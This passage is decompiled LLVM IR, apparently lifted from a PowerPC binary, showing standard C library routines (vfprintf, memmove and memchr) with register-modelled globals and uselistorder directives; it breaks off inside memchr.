  uselistorder i32 %v3_10011388, { 1, 0, 2 }
  uselistorder i32 %v0_10011380, { 0, 2, 1 }
  uselistorder i32 %v3_10011334, { 1, 0, 2 }
  uselistorder i32 %v1_100112f4, { 1, 0 }
  uselistorder i32 %v2_100112d8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100112d0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100112cc, { 1, 0 }
  uselistorder i32 %v0_10011344, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10011298, { 1, 2, 0 }
  uselistorder i32 %v1_1001127c, { 1, 0, 2 }
  uselistorder i32 %v2_10011278, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_10011248, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_10011218, { 2, 0, 1 }
  uselistorder i32 %v2_10011214, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10011184, { 1, 0 }
  uselistorder i32 %v2_100110e8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_100110bc, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10011084, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1001107c, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10011048, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10011038, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1001102c, { 1, 0, 2 }
  uselistorder i32 %v1_10011010, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10010fc8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10010fb8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10010f9c, { 1, 0 }
  uselistorder i32 %v1_10010f78, { 1, 0 }
  uselistorder i32 %v2_10010f58, { 1, 0, 2 }
  uselistorder i32 %v0_10010f00, { 1, 0 }
  uselistorder i32 %v1_10010d64, { 1, 0 }
  uselistorder i32 %v0_10010df0, { 2, 1, 0 }
  uselistorder i32 %v1_10010d38, { 1, 0 }
  uselistorder i32 %v1_10010d18, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 5, 2, 1, 4 }
  uselistorder i32 45, { 2, 1, 0 }
  uselistorder i32 112, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 176, { 2, 3, 0, 4, 1 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 57, { 1, 2, 3, 0 }
  uselistorder i32 102, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1001a460.798 to i32), { 2, 0, 1 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011368, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100112c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011278.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10011264, { 1, 0 }
  uselistorder label %dec_label_pc_10011240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011214, { 1, 0 }
  uselistorder label %dec_label_pc_10011200, { 1, 0 }
  uselistorder label %dec_label_pc_100111e4, { 1, 0 }
  uselistorder label %dec_label_pc_100111bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001119c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011178, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001115c, { 1, 0 }
  uselistorder label %dec_label_pc_100110cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011068, { 1, 0 }
  uselistorder label %dec_label_pc_10011028, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010fec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010fc0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010fa0, { 1, 0 }
  uselistorder label %dec_label_pc_10010f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10010e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10010d74, { 1, 0 }
  uselistorder label %dec_label_pc_10010d48, { 1, 0 }
  uselistorder label %dec_label_pc_10010d3c, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_100113c8 = load i32, i32* @r3, align 4
  %v0_100113d0 = load i32, i32* @r4, align 4
  store i32 %v0_100113d0, i32* @r29, align 4
  store i32 %v0_100113c8, i32* @r31, align 4
  %v1_100113dc = add i32 %v0_100113c8, 52
  %v2_100113dc = inttoptr i32 %v1_100113dc to i32*
  %v3_100113dc = load i32, i32* %v2_100113dc, align 4
  store i32 %v3_100113dc, i32* @r28, align 4
  %v0_100113e0 = load i32, i32* @r5, align 4
  store i32 %v0_100113e0, i32* @r27, align 4
  %v2_100113e4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100113e4, i32* @r3, align 4
  %v3_100113ec = icmp eq i32 %v3_100113dc, 0
  br i1 %v3_100113ec, label %dec_label_pc_100113f8, label %dec_label_pc_10011404

dec_label_pc_100113f8:                            ; preds = %entry
  %v0_100113f8 = call i32 @__pthread_return_void()
  %v0_10011400 = call i32 @__pthread_return_0()
  %v0_10011404.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011404

dec_label_pc_10011404:                            ; preds = %entry, %dec_label_pc_100113f8
  %v0_10011404 = phi i32 [ %v0_100113c8, %entry ], [ %v0_10011404.pre, %dec_label_pc_100113f8 ]
  %v1_10011404 = inttoptr i32 %v0_10011404 to i16*
  %v2_10011404 = load i16, i16* %v1_10011404, align 2
  %v3_10011404 = zext i16 %v2_10011404 to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_10011404, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_10011414 = call i32 @__asm_rlwinm(i32 %v3_10011404, i32 0, i32 24, i32 25)
  %v3_10011418 = icmp eq i32 %v1_10011414, 192
  br i1 %v3_10011418, label %dec_label_pc_1001142c, label %dec_label_pc_10011420

dec_label_pc_10011420:                            ; preds = %dec_label_pc_10011404
  store i32 268506148, i32* @lr, align 4
  %v0_10011420 = call i32 @__stdio_trans2w_o()
  %v3_10011424 = icmp eq i32 %v0_10011420, 0
  br i1 %v3_10011424, label %dec_label_pc_1001142c, label %dec_label_pc_10011440

dec_label_pc_1001142c:                            ; preds = %dec_label_pc_10011420, %dec_label_pc_10011404
  %v0_1001142c = load i32, i32* @r29, align 4
  store i32 %v0_1001142c, i32* @r4, align 4
  %v0_10011430 = load i32, i32* @r27, align 4
  store i32 %v0_10011430, i32* @r5, align 4
  %v0_10011434 = load i32, i32* @r31, align 4
  store i32 %v0_10011434, i32* @r3, align 4
  store i32 268506172, i32* @lr, align 4
  %v0_10011438 = call i32 @_vfprintf_internal()
  store i32 %v0_10011438, i32* @r30, align 4
  br label %dec_label_pc_10011440

dec_label_pc_10011440:                            ; preds = %dec_label_pc_10011420, %dec_label_pc_1001142c
  %v0_10011440 = load i32, i32* @r28, align 4
  %v3_10011440 = icmp eq i32 %v0_10011440, 0
  store i32 %v2_100113e4, i32* @r3, align 4
  br i1 %v3_10011440, label %dec_label_pc_10011450, label %dec_label_pc_10011454

dec_label_pc_10011450:                            ; preds = %dec_label_pc_10011440
  %v0_10011450 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10011454

dec_label_pc_10011454:                            ; preds = %dec_label_pc_10011440, %dec_label_pc_10011450
  %v0_10011458 = load i32, i32* @r30, align 4
  ret i32 %v0_10011458

; uselistorder directives
  uselistorder i32 %v0_10011404, { 1, 0 }
  uselistorder i32 %v0_100113c8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011454, { 1, 0 }
  uselistorder label %dec_label_pc_10011440, { 1, 0 }
  uselistorder label %dec_label_pc_10011404, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1001146c = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_10011474 = load i32, i32* @r5, align 4
  store i32 %v0_10011474, i32* @r11, align 4
  br i1 %v2_1001146c, label %dec_label_pc_10011480, label %dec_label_pc_1001147c

dec_label_pc_1001147c:                            ; preds = %entry
  %v0_1001147c = call i32 @memcpy()
  store i32 %v0_1001147c, i32* @r3, align 4
  %v0_10011480.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10011480

dec_label_pc_10011480:                            ; preds = %entry, %dec_label_pc_1001147c
  %v0_10011480 = phi i32 [ %v0_10011474, %entry ], [ %v0_10011480.pre, %dec_label_pc_1001147c ]
  %v1_10011480 = call i32 @__asm_rlwinm.(i32 %v0_10011480, i32 29, i32 3, i32 31)
  store i32 %v1_10011480, i32* %r9.global-to-local, align 4
  %v4_10011480 = icmp eq i32 %v1_10011480, 0
  %v1_10011484 = load i32, i32* @r5, align 4
  %v2_10011484 = add i32 %v1_10011484, %arg2
  store i32 %v2_10011484, i32* %r4.global-to-local, align 4
  %v0_10011488 = load i32, i32* @r3, align 4
  %v2_10011488 = add i32 %v0_10011488, %v1_10011484
  store i32 %v2_10011488, i32* %r10.global-to-local, align 4
  br i1 %v4_10011480, label %dec_label_pc_100114b0, label %dec_label_pc_10011490

dec_label_pc_10011490:                            ; preds = %dec_label_pc_10011480
  %v1_10011490 = urem i32 %v2_10011488, 4
  %v3_10011490 = icmp eq i32 %v1_10011490, 0
  br i1 %v3_10011490, label %dec_label_pc_10011498, label %dec_label_pc_100114e4

dec_label_pc_10011498:                            ; preds = %dec_label_pc_100114fc.dec_label_pc_10011498_crit_edge, %dec_label_pc_10011490
  %v1_100114a4.pre = phi i32 [ %v1_100114a4.pre.pre, %dec_label_pc_100114fc.dec_label_pc_10011498_crit_edge ], [ %v2_10011488, %dec_label_pc_10011490 ]
  %v0_10011498 = phi i32 [ %v1_100114fc, %dec_label_pc_100114fc.dec_label_pc_10011498_crit_edge ], [ %v1_10011480, %dec_label_pc_10011490 ]
  store i32 %v0_10011498, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001149c

dec_label_pc_1001149c:                            ; preds = %dec_label_pc_1001149c, %dec_label_pc_10011498
  %v1_100114a4 = phi i32 [ %v2_100114a8, %dec_label_pc_1001149c ], [ %v1_100114a4.pre, %dec_label_pc_10011498 ]
  %v0_1001149c = load i32, i32* %r4.global-to-local, align 4
  %v1_1001149c = add i32 %v0_1001149c, -4
  %v2_1001149c = inttoptr i32 %v1_1001149c to i32*
  %v3_1001149c = load i32, i32* %v2_1001149c, align 4
  %v1_100114a0 = add i32 %v0_1001149c, -8
  %v2_100114a0 = inttoptr i32 %v1_100114a0 to i32*
  %v3_100114a0 = load i32, i32* %v2_100114a0, align 4
  store i32 %v3_100114a0, i32* %r9.global-to-local, align 4
  store i32 %v1_100114a0, i32* %r4.global-to-local, align 4
  %v2_100114a4 = add i32 %v1_100114a4, -4
  %v3_100114a4 = inttoptr i32 %v2_100114a4 to i32*
  store i32 %v3_1001149c, i32* %v3_100114a4, align 4
  %v0_100114a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100114a8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100114a8 = add i32 %v1_100114a8, -8
  %v3_100114a8 = inttoptr i32 %v2_100114a8 to i32*
  store i32 %v0_100114a8, i32* %v3_100114a8, align 4
  store i32 %v2_100114a8, i32* %r10.global-to-local, align 4
  %v0_100114ac = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114ac = add i32 %v0_100114ac, -1
  store i32 %v1_100114ac, i32* %ctr.global-to-local, align 4
  %v2_100114ac = icmp eq i32 %v1_100114ac, 0
  br i1 %v2_100114ac, label %dec_label_pc_100114b0, label %dec_label_pc_1001149c

dec_label_pc_100114b0:                            ; preds = %dec_label_pc_1001149c, %dec_label_pc_100114fc, %dec_label_pc_10011480
  %v0_100114b0 = load i32, i32* @r11, align 4
  %v1_100114b0 = urem i32 %v0_100114b0, 8
  store i32 %v1_100114b0, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_100114b0, 4
  br i1 %tmp, label %dec_label_pc_100114c8, label %dec_label_pc_100114bc

dec_label_pc_100114bc:                            ; preds = %dec_label_pc_100114b0
  %v0_100114bc = load i32, i32* %r4.global-to-local, align 4
  %v1_100114bc = add i32 %v0_100114bc, -4
  %v2_100114bc = inttoptr i32 %v1_100114bc to i32*
  %v3_100114bc = load i32, i32* %v2_100114bc, align 4
  store i32 %v1_100114bc, i32* %r4.global-to-local, align 4
  %v1_100114c0 = add nsw i32 %v1_100114b0, -4
  store i32 %v1_100114c0, i32* %r5.global-to-local, align 4
  %v1_100114c4 = load i32, i32* %r10.global-to-local, align 4
  %v2_100114c4 = add i32 %v1_100114c4, -4
  %v3_100114c4 = inttoptr i32 %v2_100114c4 to i32*
  store i32 %v3_100114bc, i32* %v3_100114c4, align 4
  store i32 %v2_100114c4, i32* %r10.global-to-local, align 4
  %v0_100114c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100114c8

dec_label_pc_100114c8:                            ; preds = %dec_label_pc_100114b0, %dec_label_pc_100114bc
  %v0_100114d0 = phi i32 [ %v1_100114b0, %dec_label_pc_100114b0 ], [ %v0_100114c8.pre, %dec_label_pc_100114bc ]
  %v3_100114c8 = icmp eq i32 %v0_100114d0, 0
  br i1 %v3_100114c8, label %dec_label_pc_10011508, label %dec_label_pc_100114d0

dec_label_pc_100114d0:                            ; preds = %dec_label_pc_100114c8
  store i32 %v0_100114d0, i32* %ctr.global-to-local, align 4
  %v2_100114d8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100114d4

dec_label_pc_100114d4:                            ; preds = %dec_label_pc_100114d4, %dec_label_pc_100114d0
  %v2_100114d8 = phi i32 [ %v3_100114d8, %dec_label_pc_100114d4 ], [ %v2_100114d8.pre, %dec_label_pc_100114d0 ]
  %v0_100114d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100114d4 = add i32 %v0_100114d4, -1
  %v2_100114d4 = inttoptr i32 %v1_100114d4 to i8*
  %v3_100114d4 = load i8, i8* %v2_100114d4, align 1
  store i32 %v1_100114d4, i32* %r4.global-to-local, align 4
  %v3_100114d8 = add i32 %v2_100114d8, -1
  %v4_100114d8 = inttoptr i32 %v3_100114d8 to i8*
  store i8 %v3_100114d4, i8* %v4_100114d8, align 1
  store i32 %v3_100114d8, i32* %r10.global-to-local, align 4
  %v0_100114dc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114dc = add i32 %v0_100114dc, -1
  store i32 %v1_100114dc, i32* %ctr.global-to-local, align 4
  %v2_100114dc = icmp eq i32 %v1_100114dc, 0
  br i1 %v2_100114dc, label %dec_label_pc_10011508, label %dec_label_pc_100114d4

dec_label_pc_100114e4:                            ; preds = %dec_label_pc_10011490
  %v1_100114e4 = sub nsw i32 4, %v1_10011490
  store i32 %v1_100114e4, i32* %ctr.global-to-local, align 4
  %v2_100114ec = sub i32 %v1_10011484, %v1_100114e4
  store i32 %v2_100114ec, i32* @r11, align 4
  %v1_100114f09 = add i32 %v2_10011484, -1
  %v2_100114f010 = inttoptr i32 %v1_100114f09 to i8*
  %v3_100114f011 = load i8, i8* %v2_100114f010, align 1
  store i32 %v1_100114f09, i32* %r4.global-to-local, align 4
  %v3_100114f413 = add i32 %v2_10011488, -1
  %v4_100114f414 = inttoptr i32 %v3_100114f413 to i8*
  store i8 %v3_100114f011, i8* %v4_100114f414, align 1
  store i32 %v3_100114f413, i32* %r10.global-to-local, align 4
  %v0_100114f815 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114f816 = add i32 %v0_100114f815, -1
  store i32 %v1_100114f816, i32* %ctr.global-to-local, align 4
  %v2_100114f817 = icmp eq i32 %v1_100114f816, 0
  br i1 %v2_100114f817, label %dec_label_pc_100114fc, label %dec_label_pc_100114f0.dec_label_pc_100114f0_crit_edge

dec_label_pc_100114f0.dec_label_pc_100114f0_crit_edge: ; preds = %dec_label_pc_100114e4, %dec_label_pc_100114f0.dec_label_pc_100114f0_crit_edge
  %v3_100114f418 = phi i32 [ %v3_100114f4, %dec_label_pc_100114f0.dec_label_pc_100114f0_crit_edge ], [ %v3_100114f413, %dec_label_pc_100114e4 ]
  %v0_100114f0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_100114f0 = add i32 %v0_100114f0.pre, -1
  %v2_100114f0 = inttoptr i32 %v1_100114f0 to i8*
  %v3_100114f0 = load i8, i8* %v2_100114f0, align 1
  store i32 %v1_100114f0, i32* %r4.global-to-local, align 4
  %v3_100114f4 = add i32 %v3_100114f418, -1
  %v4_100114f4 = inttoptr i32 %v3_100114f4 to i8*
  store i8 %v3_100114f0, i8* %v4_100114f4, align 1
  store i32 %v3_100114f4, i32* %r10.global-to-local, align 4
  %v0_100114f8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114f8 = add i32 %v0_100114f8, -1
  store i32 %v1_100114f8, i32* %ctr.global-to-local, align 4
  %v2_100114f8 = icmp eq i32 %v1_100114f8, 0
  br i1 %v2_100114f8, label %dec_label_pc_100114fc, label %dec_label_pc_100114f0.dec_label_pc_100114f0_crit_edge

dec_label_pc_100114fc:                            ; preds = %dec_label_pc_100114f0.dec_label_pc_100114f0_crit_edge, %dec_label_pc_100114e4
  %v0_100114fc = load i32, i32* @r11, align 4
  %v1_100114fc = call i32 @__asm_rlwinm.(i32 %v0_100114fc, i32 29, i32 3, i32 31)
  store i32 %v1_100114fc, i32* %r9.global-to-local, align 4
  %v4_100114fc = icmp eq i32 %v1_100114fc, 0
  br i1 %v4_100114fc, label %dec_label_pc_100114b0, label %dec_label_pc_100114fc.dec_label_pc_10011498_crit_edge

dec_label_pc_100114fc.dec_label_pc_10011498_crit_edge: ; preds = %dec_label_pc_100114fc
  %v1_100114a4.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011498

dec_label_pc_10011508:                            ; preds = %dec_label_pc_100114d4, %dec_label_pc_100114c8
  %v0_10011508 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_10011508

; uselistorder directives
  uselistorder i32 %v1_100114fc, { 1, 2, 0 }
  uselistorder i32 %v1_100114f8, { 1, 0 }
  uselistorder i32 %v3_100114f4, { 1, 2, 0 }
  uselistorder i32 %v1_100114dc, { 1, 0 }
  uselistorder i32 %v3_100114d8, { 1, 2, 0 }
  uselistorder i32 %v1_100114b0, { 3, 2, 1, 0 }
  uselistorder i32 %v1_100114ac, { 1, 0 }
  uselistorder i32 %v2_100114a8, { 1, 2, 0 }
  uselistorder i32 %v1_10011490, { 1, 0 }
  uselistorder i32 %v2_10011488, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10011484, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 6, 7, 2, 8, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_100114f0.dec_label_pc_100114f0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100114c8, { 1, 0 }
  uselistorder label %dec_label_pc_100114b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011480, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10011514 = urem i32 %arg1, 256
  store i32 %v1_10011514, i32* %r4.global-to-local, align 4
  %v0_100115347 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1001153813 = icmp eq i32 %arg2, 0
  br i1 %v2_1001153813, label %dec_label_pc_10011540, label %dec_label_pc_1001153c

dec_label_pc_10011520:                            ; preds = %dec_label_pc_1001153c
  %v1_10011520 = inttoptr i32 %v0_10011520 to i8*
  %v2_10011520 = load i8, i8* %v1_10011520, align 1
  %v3_10011520 = zext i8 %v2_10011520 to i32
  %v0_10011524 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011524 = add i32 %v0_10011524, -1
  store i32 %v1_10011524, i32* %r5.global-to-local, align 4
  %v1_10011528 = load i32, i32* %r4.global-to-local, align 4
  %v4_10011528 = icmp eq i32 %v3_10011520, %v1_10011528
  %v0_1001152c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011528, i32 %v0_1001152c)
  %v0_10011530 = load i32, i32* @r3, align 4
  %v1_10011530 = add i32 %v0_10011530, 1
  store i32 %v1_10011530, i32* @r3, align 4
  %v0_10011538 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011538 = add i32 %v0_10011538, -1
  store i32 %v1_10011538, i32* %ctr.global-to-local, align 4
  %v2_10011538 = icmp eq i32 %v1_10011538, 0
  br i1 %v2_10011538, label %dec_label_pc_10011540.loopexit, label %dec_label_pc_1001153c

dec_label_pc_1001153c:                            ; preds = %entry, %dec_label_pc_10011520
  %v0_10011520 = phi i32 [ %v1_10011530, %dec_label_pc_10011520 ], [ %v0_100115347, %entry ]
  %v0_1001153c.in.in = phi i32 [ %v1_10011530, %dec_label_pc_10011520 ], [ %v0_100115347, %entry ]
  %v0_1001153c.in = urem i32 %v0_1001153c.in.in, 4
  %v0_1001153c = icmp eq i32 %v0_1001153c.in, 0
  br i1 %v0_1001153c, label %dec_label_pc_10011540.loopexit, label %dec_label_pc_10011520

dec_label_pc_10011540.loopexit:                   ; preds = %dec_label_pc_1001153c, %dec_label_pc_10011520
  %v0_1001156816.ph = phi i32 [ %v1_10011530, %dec_label_pc_10011520 ], [ %v0_10011520, %dec_label_pc_1001153c ]
  %v0_10011540.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10011544.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011540

dec_label_pc_10011540:                            ; preds = %dec_label_pc_10011540.loopexit, %entry
  %v0_10011544 = phi i32 [ 0, %entry ], [ %v0_10011544.pre, %dec_label_pc_10011540.loopexit ]
  %v0_10011540 = phi i32 [ %v1_10011514, %entry ], [ %v0_10011540.pre, %dec_label_pc_10011540.loopexit ]
  %v0_1001156816 = phi i32 [ %v0_100115347, %entry ], [ %v0_1001156816.ph, %dec_label_pc_10011540.loopexit ]
  %v1_10011540 = mul i32 %v0_10011540, 256
  %v1_10011544 = udiv i32 %v0_10011544, 4
  %v2_10011548 = or i32 %v1_10011540, %v0_10011540
  %v1_10011550 = mul i32 %v2_10011548, 65536
  %v2_1001155c = or i32 %v1_10011550, %v2_10011548
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_10011544, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10011544, 4
  br i1 %tmp, label %dec_label_pc_100115f0, label %dec_label_pc_10011568

dec_label_pc_10011568:                            ; preds = %dec_label_pc_10011540, %dec_label_pc_100115ec.backedge
  %v0_100115ec = phi i32 [ %v1_100115ec, %dec_label_pc_100115ec.backedge ], [ %v1_10011544, %dec_label_pc_10011540 ]
  %v0_10011570 = phi i32 [ %v1_10011570, %dec_label_pc_100115ec.backedge ], [ %v0_10011544, %dec_label_pc_10011540 ]
  %v0_100115a8 = phi i32 [ %v1_1001156c, %dec_label_pc_100115ec.backedge ], [ %v0_1001156816, %dec_label_pc_10011540 ]
  %v1_10011568 = inttoptr i32 %v0_100115a8 to i32*
  %v2_10011568 = load i32, i32* %v1_10011568, align 4
  %v1_1001156c = add i32 %v0_100115a8, 4
  store i32 %v1_1001156c, i32* @r3, align 4
  %v1_10011570 = add i32 %v0_10011570, -4
  store i32 %v1_10011570, i32* %r5.global-to-local, align 4
  %v1_10011574 = add i32 %v0_100115a8, 1
  %v2_10011578 = xor i32 %v2_10011568, %v2_1001155c
  %v1_10011580 = add i32 %v2_10011578, 2130640639
  %v2_10011584 = xor i32 %v1_10011580, %v2_10011578
  %v2_10011588 = and i32 %v2_10011584, -2130640640
  %v6_10011588 = icmp eq i32 %v2_10011588, -2130640640
  br i1 %v6_10011588, label %dec_label_pc_100115ec.backedge, label %dec_label_pc_10011594

dec_label_pc_100115ec.backedge:                   ; preds = %dec_label_pc_10011568, %dec_label_pc_100115d8
  %v1_100115ec = add i32 %v0_100115ec, -1
  store i32 %v1_100115ec, i32* %ctr.global-to-local, align 4
  %v2_100115ec = icmp eq i32 %v1_100115ec, 0
  br i1 %v2_100115ec, label %dec_label_pc_100115f0, label %dec_label_pc_10011568

dec_label_pc_10011594:                            ; preds = %dec_label_pc_10011568
  %v2_10011594 = inttoptr i32 %v0_100115a8 to i8*
  %v3_10011594 = load i8, i8* %v2_10011594, align 1
  %v4_10011594 = zext i8 %v3_10011594 to i32
  %v1_10011598 = add i32 %v0_100115a8, 3
  store i32 %v1_10011598, i32* @r8, align 4
  %v1_1001159c = add i32 %v0_100115a8, 2
  %v4_100115a0 = icmp eq i32 %v4_10011594, %v0_10011540
  br i1 %v4_100115a0, label %dec_label_pc_100115a8, label %dec_label_pc_100115b0

dec_label_pc_100115a8:                            ; preds = %dec_label_pc_10011594
  ret i32 %v0_100115a8

dec_label_pc_100115b0:                            ; preds = %dec_label_pc_10011594
  %v2_100115b0 = inttoptr i32 %v1_10011574 to i8*
  %v3_100115b0 = load i8, i8* %v2_100115b0, align 1
  %v4_100115b0 = zext i8 %v3_100115b0 to i32
  %v4_100115b4 = icmp eq i32 %v4_100115b0, %v0_10011540
  br i1 %v4_100115b4, label %dec_label_pc_100115bc, label %dec_label_pc_100115c4

dec_label_pc_100115bc:                            ; preds = %dec_label_pc_100115b0
  ret i32 %v1_10011574

dec_label_pc_100115c4:                            ; preds = %dec_label_pc_100115b0
  %v2_100115c4 = inttoptr i32 %v1_1001159c to i8*
  %v3_100115c4 = load i8, i8* %v2_100115c4, align 1
  %v4_100115c4 = zext i8 %v3_100115c4 to i32
  %v4_100115c8 = icmp eq i32 %v4_100115c4, %v0_10011540
  br i1 %v4_100115c8, label %dec_label_pc_100115d0, label %dec_label_pc_100115d8

dec_label_pc_100115d0:                            ; preds = %dec_label_pc_100115c4
  ret i32 %v1_1001159c

dec_label_pc_100115d8:                            ; preds = %dec_label_pc_100115c4
  %v2_100115d8 = inttoptr i32 %v1_10011598 to i8*
  %v3_100115d8 = load i8, i8* %v2_100115d8, align 1
